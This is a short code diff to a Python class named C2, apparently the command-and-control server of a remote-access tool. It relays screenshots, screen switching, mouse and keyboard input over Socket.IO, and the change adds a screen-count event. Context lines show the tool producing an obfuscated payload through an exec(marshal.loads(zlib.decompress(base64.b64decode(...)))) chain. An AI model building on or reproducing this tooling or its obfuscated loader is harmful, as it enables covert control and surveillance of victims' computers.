@@ -31,6 +31,7 @@ class C2:
         self.sio.on("screen_status", self.screen_status)
         self.sio.on("screenshot", self.screenshot_taken)
         self.sio.on("switch_screen", self.switch_screen)
+        self.sio.on("screen_count", self.screen_count)
 
         self.sio.on("mouse_input", self.mouse_input)
         self.sio.on("keyboard_input", self.keyboard_input)
@@ -359,3 +360,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def mouse_click_right(self, sid, data):
         self.sio.emit("mouse_click_right", data)
+
+    def screen_count(self, sid, data):
+        self.sio.emit("screen_count", data)
